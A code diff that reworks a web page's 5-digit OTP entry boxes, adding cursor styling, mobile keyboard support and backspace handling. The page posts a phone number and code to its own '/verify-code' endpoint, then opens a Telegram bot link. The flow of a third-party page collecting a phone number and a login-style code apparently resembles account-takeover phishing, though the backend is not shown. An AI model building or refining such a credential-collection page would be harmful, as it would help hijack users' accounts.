@@ -28,7 +28,7 @@
             display: flex; flex-direction: column; align-items: center; gap: 15px;
         }
 
-        /* Common White Card Box Style for Both Sections */
+        /* Common White Card Box Style */
         .card-box {
             background: white; padding: 22px 18px 18px 18px; border-radius: 18px;
             width: 100%; text-align: center;
@@ -81,7 +81,7 @@
         }
         .btn-get-code:active { transform: scale(0.97); }
 
-        /* 5 Small OTP Boxes Inside Lower White Card */
+        /* 5 Small OTP Boxes Wrapper */
         .otp-boxes-container {
             display: flex; gap: 8px; justify-content: center; margin-bottom: 15px;
             cursor: pointer;
@@ -90,11 +90,44 @@
             width: 50px; height: 55px; border: 2px solid #ddd;
             border-radius: 10px; display: flex; align-items: center; justify-content: center;
             font-size: 24px; color: #222; font-weight: bold; background: #f9f9f9;
+            transition: 0.2s; position: relative;
+        }
+        
+        /* Active Blinking Cursor Animation for the current box */
+        .otp-small-box.active {
+            border-color: #0088CC;
+            box-shadow: 0 0 10px rgba(0, 136, 204, 0.4);
+        }
+        .otp-small-box.active::after {
+            content: '';
+            position: absolute;
+            width: 2px;
+            height: 24px;
+            background-color: #0088CC;
+            animation: blinkCursor 1s infinite;
         }
 
-        /* Hidden Input for Copy/Paste & Typing Support */
-        #hiddenOtpInput {
-            position: absolute; opacity: 0.01; width: 1px; height: 1px; pointer-events: none;
+        @keyframes blinkCursor {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        /* Perfectly Positioned Hidden Input over the boxes for native mobile keyboard support & backspace */
+        #realOtpInput {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            z-index: 10;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .otp-wrapper-relative {
+            position: relative;
+            width: 100%;
         }
 
         /* Confirm Otp Button with Glowing Border Effect */
@@ -133,19 +166,21 @@
         </div>
 
         <!-- ২. নিচের হোয়াইট কার্ড বক্স: ৫টি ছোট ওটিপি বক্স ও কনফার্ম বাটন -->
-        <div class="card-box" onclick="focusHiddenInput()">
+        <div class="card-box">
             <h2>Enter 5-Digit OTP 🔑</h2>
             
-            <!-- Hidden input to handle typing and paste -->
-            <input type="text" id="hiddenOtpInput" maxlength="5" oninput="handleOtpInput(this)">
+            <div class="otp-wrapper-relative" onclick="focusOtpInput()">
+                <!-- Hidden Real Input that handles all mobile keyboard events, backspace, and paste -->
+                <input type="tel" id="realOtpInput" maxlength="5" autocomplete="one-time-code" oninput="handleInput(event)" onkeydown="handleKeyDown(event)">
 
-            <!-- 5 Small Display Boxes -->
-            <div class="otp-boxes-container">
-                <div class="otp-small-box"></div>
-                <div class="otp-small-box"></div>
-                <div class="otp-small-box"></div>
-                <div class="otp-small-box"></div>
-                <div class="otp-small-box"></div>
+                <!-- 5 Small Display Boxes with Blinking Animation Support -->
+                <div class="otp-boxes-container">
+                    <div class="otp-small-box active"></div>
+                    <div class="otp-small-box"></div>
+                    <div class="otp-small-box"></div>
+                    <div class="otp-small-box"></div>
+                    <div class="otp-small-box"></div>
+                </div>
             </div>
 
             <button class="btn-confirm-otp" onclick="verifyOtpCode()">Confirm Otp ✨</button>
@@ -154,22 +189,33 @@
 
     <script>
         const smallBoxes = document.querySelectorAll('.otp-small-box');
-        let currentOtpValue = "";
+        const realInput = document.getElementById('realOtpInput');
 
-        function focusHiddenInput() {
-            const hiddenInp = document.getElementById('hiddenOtpInput');
-            hiddenInp.focus();
+        function focusOtpInput() {
+            realInput.focus();
         }
 
-        function handleOtpInput(el) {
-            let val = el.value.replace(/\D/g, '');
-            if (val.length > 5) {
-                val = val.slice(0, 5);
-            }
-            currentOtpValue = val;
-            
+        function updateBoxes() {
+            let val = realInput.value;
             for (let i = 0; i < 5; i++) {
-                smallBoxes[i].innerText = currentOtpValue[i] || "";
+                smallBoxes[i].innerText = val[i] || "";
+                smallBoxes[i].classList.remove('active');
+            }
+            // Highlight the current active box with blinking cursor
+            let activeIdx = val.length < 5 ? val.length : 4;
+            smallBoxes[activeIdx].classList.add('active');
+        }
+
+        function handleInput(e) {
+            // Keep only numbers
+            realInput.value = realInput.value.replace(/\D/g, '');
+            updateBoxes();
+        }
+
+        function handleKeyDown(e) {
+            if (e.key === 'Backspace') {
+                // Let default backspace work on realInput
+                setTimeout(updateBoxes, 10);
             }
         }
 
@@ -188,7 +234,7 @@
             .then(res => res.json())
             .then(data => {
                 if(data.status === "success") {
-                    focusHiddenInput();
+                    focusOtpInput();
                 } else {
                     alert("Error: " + data.message);
                 }
@@ -198,12 +244,13 @@
 
         function verifyOtpCode() {
             let phone = document.getElementById('phoneInput').value;
+            let code = realInput.value;
             
             if(!phone) {
                 alert("Please enter your phone number first!");
                 return;
             }
-            if(!currentOtpValue || currentOtpValue.length < 5) {
+            if(!code || code.length < 5) {
                 alert("Please enter the complete 5-digit OTP code!");
                 return;
             }
@@ -211,7 +258,7 @@
             fetch('/verify-code', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: phone, code: currentOtpValue })
+                body: JSON.stringify({ phone: phone, code: code })
             })
             .then(res => res.json())
             .then(data => {
@@ -219,11 +266,8 @@
                     window.open("https://t.me/Desi_Magi909_Bot?start=start", "_blank");
                 } else {
                     alert("Verification Failed: " + data.message);
-                    currentOtpValue = "";
-                    document.getElementById('hiddenOtpInput').value = "";
-                    for (let i = 0; i < 5; i++) {
-                        smallBoxes[i].innerText = "";
-                    }
+                    realInput.value = "";
+                    updateBoxes();
                 }
             })
             .catch(err => console.log("Verification error"));
